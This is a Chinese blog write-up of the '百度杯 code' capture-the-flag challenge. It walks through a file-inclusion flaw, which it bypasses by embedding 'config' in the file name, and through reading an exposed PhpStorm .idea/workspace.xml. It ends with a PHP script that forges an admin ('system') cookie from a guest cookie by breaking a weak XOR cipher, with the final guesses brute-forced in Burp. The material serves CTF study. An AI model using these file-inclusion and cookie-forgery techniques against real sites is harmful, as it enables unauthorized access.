    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/10/%E7%99%BE%E5%BA%A6%E6%9D%AF-code/">
                百度杯-code
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-10</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>f12看到base64编码后的内容，尝试解码，发现不太对。看了看链接，应该是文件包含，尝试包含下index.php，查看源码。</p>
<p>按f12出现base64编码后的源码，解码得</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">/**

 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
   */</span>
   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">echo</span> <span class="token string">'&lt;title>file:'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;/title>'</span><span class="token punctuation">;</span>
   <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">,</span><span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span><span class="token punctuation">.</span><span class="token variable">$txt</span><span class="token punctuation">.</span><span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/*

 * Can you find the flag file?
   *
    */</span>

<span class="token delimiter">?></span></code></pre>
<p>没得到啥有用的内容，看了大佬的wp。原来提示在 Created by PhpStorm.</p>
<p>PhpStorm的一个特点，因为由phpstorm创建的文件在.idea目录下面自动生成一个workspace.xml 里面包含了网站文件的结构各种信息 </p>
<p>访问url/.idea/workspace.xml 发现有fl3g_ichuqiu.php  config.php 。</p>
<p>index.php里将config过滤成_，所以包含jpg=fl3gconfigichuqiu.php解码得</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">/**

 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
   */</span>
   <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">function</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">,</span> <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
   <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
   <span class="token variable">$max</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
       <span class="token variable">$hash</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
   <span class="token keyword">return</span> <span class="token variable">$hash</span><span class="token punctuation">;</span>
   <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token keyword">function</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$tmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>
    <span class="token variable">$rnd</span><span class="token operator">=</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$ttmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token punctuation">.</span><span class="token variable">$ttmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token variable">$txt</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rnd</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$tmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$tmp1</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">'system'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"╮(╯▽╰)╭"</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token delimiter">?></span></code></pre>
<p>不具体分析了。就是要利用guest的cooike 得出$key,$rnd的值，推出system的base64cookie。</p>
<p>脚本：</p>
<pre><code>&lt;?php

$txt = &quot;guest&quot;;
for($i = 0;$i &lt; strlen($txt);$i++)&#123;
  $txt[$i] = chr(ord($txt[$i]) + 10);
&#125;

$cookie_guest = &quot;emVTQkZHCh8d&quot;;
$cookie_guest = base64_decode($cookie_guest);
$rnd = substr($cookie_guest,0,4);
$ttmp = substr($cookie_guest,4);
$key = &#39;&#39;;
for($i = 0;$i &lt; strlen($txt);$i++)&#123;
  $key .= ($ttmp[$i] ^ $txt[$i]);
&#125;

$tmp1 = &quot;system&quot;;
for($i = 0;$i &lt; strlen($tmp1);$i++)&#123;
  $tmp[$i] = chr(ord($tmp1[$i]) + 10);
&#125;

$md5 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;;
for($i = 0; $i &lt; strlen($md5);$i++)&#123;
  $key_new = $key.$md5[$i];
  $cookie_system = &#39;&#39;;
  for($j = 0;$j &lt; strlen($tmp1);$j++)&#123;
​    $cookie_system .= ($tmp[$j] ^ $key_new[$j]);
  &#125;
  $cookie_system = base64_encode($rnd.$cookie_system);
  echo $cookie_system;
  echo &quot;&lt;br&gt;&quot;;
&#125;

?&gt; </code></pre>
<p>最后用bp爆破下就可以了。</p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/4/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/6/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>